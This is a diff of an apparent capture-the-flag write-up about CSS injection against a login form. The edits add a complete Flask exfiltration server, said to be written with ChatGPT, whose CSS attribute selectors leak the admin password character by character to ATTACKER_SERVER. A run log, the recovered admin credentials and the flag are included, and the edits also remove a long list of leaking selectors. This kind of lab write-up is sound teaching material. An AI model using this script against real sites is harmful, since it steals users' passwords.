@@ -70,7 +70,7 @@ url=https://fancy-login-form.ctf.zone/?theme=https://ATTACKER_SERVER/css/ocean
 ```
 {% endcode %}
 
-We get a hit for the `/css/ocean.css` file (meaning we don't control the file extension), so we can create that file on our server. Let's set the contents to import another URL.
+We get a hit for the `/css/ocean.css` file (meaning we don't control the file extension), so we can create that file on our server. Let's set the contents to import a background image.
 
 {% code overflow="wrap" %}
 ```css
@@ -79,6 +79,8 @@ body {
 }
 ```
 {% endcode %}
+
+The server gets a hit!
 
 ![](images/2.PNG)
 
@@ -203,174 +205,7 @@ input[name="password"][value^="e"] {
 input[name="password"][value^="f"] {
     background-image: url("https://ATTACKER_SERVER/f");
 }
-input[name="password"][value^="g"] {
-    background-image: url("https://ATTACKER_SERVER/g");
-}
-input[name="password"][value^="h"] {
-    background-image: url("https://ATTACKER_SERVER/h");
-}
-input[name="password"][value^="i"] {
-    background-image: url("https://ATTACKER_SERVER/i");
-}
-input[name="password"][value^="j"] {
-    background-image: url("https://ATTACKER_SERVER/j");
-}
-input[name="password"][value^="k"] {
-    background-image: url("https://ATTACKER_SERVER/k");
-}
-input[name="password"][value^="l"] {
-    background-image: url("https://ATTACKER_SERVER/l");
-}
-input[name="password"][value^="m"] {
-    background-image: url("https://ATTACKER_SERVER/m");
-}
-input[name="password"][value^="n"] {
-    background-image: url("https://ATTACKER_SERVER/n");
-}
-input[name="password"][value^="o"] {
-    background-image: url("https://ATTACKER_SERVER/o");
-}
-input[name="password"][value^="p"] {
-    background-image: url("https://ATTACKER_SERVER/p");
-}
-input[name="password"][value^="q"] {
-    background-image: url("https://ATTACKER_SERVER/q");
-}
-input[name="password"][value^="r"] {
-    background-image: url("https://ATTACKER_SERVER/r");
-}
-input[name="password"][value^="s"] {
-    background-image: url("https://ATTACKER_SERVER/s");
-}
-input[name="password"][value^="t"] {
-    background-image: url("https://ATTACKER_SERVER/t");
-}
-input[name="password"][value^="u"] {
-    background-image: url("https://ATTACKER_SERVER/u");
-}
-input[name="password"][value^="v"] {
-    background-image: url("https://ATTACKER_SERVER/v");
-}
-input[name="password"][value^="w"] {
-    background-image: url("https://ATTACKER_SERVER/w");
-}
-input[name="password"][value^="x"] {
-    background-image: url("https://ATTACKER_SERVER/x");
-}
-input[name="password"][value^="y"] {
-    background-image: url("https://ATTACKER_SERVER/y");
-}
-input[name="password"][value^="z"] {
-    background-image: url("https://ATTACKER_SERVER/z");
-}
-input[name="password"][value^="A"] {
-    background-image: url("https://ATTACKER_SERVER/A");
-}
-input[name="password"][value^="B"] {
-    background-image: url("https://ATTACKER_SERVER/B");
-}
-input[name="password"][value^="C"] {
-    background-image: url("https://ATTACKER_SERVER/C");
-}
-input[name="password"][value^="D"] {
-    background-image: url("https://ATTACKER_SERVER/D");
-}
-input[name="password"][value^="E"] {
-    background-image: url("https://ATTACKER_SERVER/E");
-}
-input[name="password"][value^="F"] {
-    background-image: url("https://ATTACKER_SERVER/F");
-}
-input[name="password"][value^="G"] {
-    background-image: url("https://ATTACKER_SERVER/G");
-}
-input[name="password"][value^="H"] {
-    background-image: url("https://ATTACKER_SERVER/H");
-}
-input[name="password"][value^="I"] {
-    background-image: url("https://ATTACKER_SERVER/I");
-}
-input[name="password"][value^="J"] {
-    background-image: url("https://ATTACKER_SERVER/J");
-}
-input[name="password"][value^="K"] {
-    background-image: url("https://ATTACKER_SERVER/K");
-}
-input[name="password"][value^="L"] {
-    background-image: url("https://ATTACKER_SERVER/L");
-}
-input[name="password"][value^="M"] {
-    background-image: url("https://ATTACKER_SERVER/M");
-}
-input[name="password"][value^="N"] {
-    background-image: url("https://ATTACKER_SERVER/N");
-}
-input[name="password"][value^="O"] {
-    background-image: url("https://ATTACKER_SERVER/O");
-}
-input[name="password"][value^="P"] {
-    background-image: url("https://ATTACKER_SERVER/P");
-}
-input[name="password"][value^="Q"] {
-    background-image: url("https://ATTACKER_SERVER/Q");
-}
-input[name="password"][value^="R"] {
-    background-image: url("https://ATTACKER_SERVER/R");
-}
-input[name="password"][value^="S"] {
-    background-image: url("https://ATTACKER_SERVER/S");
-}
-input[name="password"][value^="T"] {
-    background-image: url("https://ATTACKER_SERVER/T");
-}
-input[name="password"][value^="U"] {
-    background-image: url("https://ATTACKER_SERVER/U");
-}
-input[name="password"][value^="V"] {
-    background-image: url("https://ATTACKER_SERVER/V");
-}
-input[name="password"][value^="W"] {
-    background-image: url("https://ATTACKER_SERVER/W");
-}
-input[name="password"][value^="X"] {
-    background-image: url("https://ATTACKER_SERVER/X");
-}
-input[name="password"][value^="Y"] {
-    background-image: url("https://ATTACKER_SERVER/Y");
-}
-input[name="password"][value^="Z"] {
-    background-image: url("https://ATTACKER_SERVER/Z");
-}
-input[name="password"][value^="0"] {
-    background-image: url("https://ATTACKER_SERVER/0");
-}
-input[name="password"][value^="1"] {
-    background-image: url("https://ATTACKER_SERVER/1");
-}
-input[name="password"][value^="2"] {
-    background-image: url("https://ATTACKER_SERVER/2");
-}
-input[name="password"][value^="3"] {
-    background-image: url("https://ATTACKER_SERVER/3");
-}
-input[name="password"][value^="4"] {
-    background-image: url("https://ATTACKER_SERVER/4");
-}
-input[name="password"][value^="5"] {
-    background-image: url("https://ATTACKER_SERVER/5");
-}
-input[name="password"][value^="6"] {
-    background-image: url("https://ATTACKER_SERVER/6");
-}
-input[name="password"][value^="7"] {
-    background-image: url("https://ATTACKER_SERVER/7");
-}
-input[name="password"][value^="8"] {
-    background-image: url("https://ATTACKER_SERVER/8");
-}
-input[name="password"][value^="9"] {
-    background-image: url("https://ATTACKER_SERVER/9");
-}
+/** Add the remaining input elements for a-zA-Z0-9**/
 ```
 {% endcode %}
 
@@ -437,5 +272,137 @@ admin:F0x13foXtrOT&Elas7icBe4n5
 Welcome admin! You earned yourself a flag: flag{6b1f095e79699a79dc4a366c1131313e}
 ```
 {% endcode %}
+
+After submitting the flag, I decided to use ChatGPT to write an automated solve script. I should have done this at the start, to reduce manual effort/error 😆
+
+{% code overflow="wrap" %}
+```python
+from flask import Flask, Response
+from urllib.parse import quote
+import argparse
+import requests
+
+app = Flask(__name__)
+
+S = {
+    'attacker': 'https://ATTACKER_SERVER',
+    'target': 'https://fancy-login-form.ctf.zone',
+    'report_path': '/report.php',
+    'charset': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=~[]\\|;:\'",./',
+    'prefix': '',
+    'auto_revisit': True
+}
+
+
+def css_attr_escape(s: str) -> str:
+    return s.replace("\\", "\\\\").replace('"', '\\"')
+
+
+@app.get("/")
+def idx():
+    return f"prefix:{S['prefix']} css:{S['attacker']}/css/ocean"
+
+
+@app.get("/css/ocean.css")
+def ocean():
+    p = S['prefix']
+    rules = []
+    for ch in S['charset']:
+        cand = p + ch
+        leak = f"{S['attacker']}/leak/{quote(cand, safe='')}"
+        sel = f'input[name="password"][value^="{css_attr_escape(cand)}"]'
+        rules.append(f"{sel}{{background-image:url('{leak}')}}")
+    css = ''.join(rules)
+    resp = Response(css, mimetype="text/css")
+    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    resp.headers['Pragma'] = 'no-cache'
+    resp.headers['Expires'] = '0'
+    return resp
+
+
+@app.get("/leak/<path:cand>")
+def leak(cand):
+    if cand.startswith(S['prefix']) and len(cand) > len(S['prefix']):
+        S['prefix'] = cand
+        print("[+]", S['prefix'], flush=True)
+        if S.get('auto_revisit'):
+            try:
+                url = f"{S['target']}/?theme={S['attacker']}/css/ocean"
+                r = requests.post(S['target'] + S['report_path'],
+                                  data={'url': url}, timeout=8)
+                print("[*] re-report", r.status_code)
+            except Exception as e:
+                print("[!] re-report failed:", e)
+    return ""
+
+
+def report():
+    url = f"{S['target']}/?theme={S['attacker']}/css/ocean"
+    r = requests.post(S['target'] + S['report_path'],
+                      data={'url': url}, timeout=8)
+    print("[*] report", r.status_code)
+
+
+if __name__ == "__main__":
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--attacker")
+    ap.add_argument("--target")
+    ap.add_argument("--report-path")
+    ap.add_argument("--charset")
+    ap.add_argument("--start-prefix")
+    ap.add_argument("--no-auto", action="store_true")
+    ap.add_argument("--host", default="0.0.0.0")
+    ap.add_argument("--port", type=int, default=80)
+    a = ap.parse_args()
+
+    if a.attacker:
+        S['attacker'] = a.attacker.rstrip("/")
+    if a.target:
+        S['target'] = a.target.rstrip("/")
+    if a.report_path:
+        S['report_path'] = a.report_path
+    if a.charset:
+        S['charset'] = a.charset
+    if a.start_prefix:
+        S['prefix'] = a.start_prefix
+    if a.no_auto:
+        S['auto_revisit'] = False
+
+    try:
+        report()
+    except Exception as e:
+        print("[!] initial report failed:", e)
+    print("[*] serve CSS at", S['attacker'] + "/css/ocean.css")
+    app.run(host=a.host, port=a.port, debug=False)
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+sudo python exfil.py
+
+[*] report 200
+[*] serve CSS at https://ATTACKER_SERVER/css/ocean.css
+ * Serving Flask app 'exfil'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://192.168.16.128:80
+Press CTRL+C to quit
+127.0.0.1 - - [12/Aug/2025 09:29:26] "GET /css/ocean.css HTTP/1.1" 200 -
+[+] F
+[*] re-report 200
+127.0.0.1 - - [12/Aug/2025 09:29:32] "GET /leak/F HTTP/1.1" 200 -
+127.0.0.1 - - [12/Aug/2025 09:29:42] "GET /css/ocean.css HTTP/1.1" 200 -
+[+] F0
+[*] re-report 200
+127.0.0.1 - - [12/Aug/2025 09:29:58] "GET /leak/F0 HTTP/1.1" 200 -
+127.0.0.1 - - [12/Aug/2025 09:30:07] "GET /css/ocean.css HTTP/1.1" 200 -
+[+] F0x
+```
+{% endcode %}
+
+![](images/7.PNG)
 
 Flag: `flag{6b1f095e79699a79dc4a366c1131313e}`
